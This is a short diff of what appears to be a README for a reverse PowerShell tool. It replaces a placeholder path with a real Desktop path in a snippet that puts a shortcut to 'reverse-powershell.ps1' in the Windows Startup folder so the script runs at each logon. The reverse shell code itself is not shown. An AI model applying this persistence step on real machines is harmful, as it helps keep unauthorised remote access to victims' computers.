@@ -31,9 +31,11 @@ To allow the script to run, you may need to set the execution policy to `RemoteS
 ```
 
 
+
 $startupFolder = [System.Environment]::GetFolderPath('Startup')
-$scriptPath = "C:\path\to\reverse-powershell.ps1"
+$scriptPath = "C:\Users\adm\Desktop\Reverse-Powershell\reverse-powershell.ps1"
 $shortcutPath = "$startupFolder\reverse-powershell.lnk"
+
 
 $wshShell = New-Object -ComObject WScript.Shell
 $shortcut = $wshShell.CreateShortcut($shortcutPath)
